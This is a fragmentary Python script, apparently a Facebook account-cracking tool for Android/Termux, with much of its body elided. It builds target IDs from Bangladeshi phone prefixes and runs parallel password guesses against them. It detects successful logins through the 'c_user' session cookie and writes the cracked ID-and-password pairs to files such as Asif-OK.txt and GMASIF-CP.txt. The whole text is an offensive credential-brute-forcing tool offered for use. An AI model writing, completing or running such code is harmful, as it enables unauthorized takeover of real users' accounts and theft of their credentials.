...
def fuck():
    ...
    os.system('clear')
    print(logo)
    print('[×] Exm: 019, 016, 017, 018, 014, 01778')
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        for love in user:
            ...
            asha.submit(asif,uid,pwx,tl)
    print('-------------------')
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as Asif-OK.txt')
    print(' [✓] CP Id Save as Asif-CP.txt')
    print('-------------------')
def hasan(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[ASIF]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[GMASIF-CP] {cid}|{ps}")
                open('/sdcard/GMASIF-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
